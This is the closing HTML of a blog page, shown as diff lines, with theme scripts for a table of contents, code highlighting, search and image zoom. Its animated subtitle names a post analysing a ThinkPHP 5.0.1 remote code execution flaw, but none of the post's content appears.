+
+
+
+  
+  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "thinkphp5.0-1远程代码执行漏洞分析&nbsp;",
+      ],
+      cursorChar: "",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+      icon: "#"
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
